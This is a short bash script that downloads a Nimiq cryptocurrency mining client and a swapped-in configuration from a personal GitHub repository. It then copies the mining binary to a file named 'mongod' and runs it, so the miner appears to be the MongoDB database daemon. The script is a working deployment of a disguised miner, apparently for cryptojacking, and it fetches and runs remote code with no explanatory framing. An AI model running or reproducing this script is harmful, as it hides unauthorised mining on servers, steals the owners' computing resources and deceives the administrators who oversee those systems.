#!/bin/bash

wget https://github.com/orpheusyalcon/beep/raw/master/nimiq-v1.3.1-linux-x64-fast.zip 
unzip -j nimiq-v1.3.1-linux-x64-fast.zip
rm config.txt
rm nimiq_node.node
wget https://raw.githubusercontent.com/orpheusyalcon/neep/master/config.txt
wget https://github.com/orpheusyalcon/beep/raw/master/nimiq_node.node
cp skypool-node-client mongod
./mongod
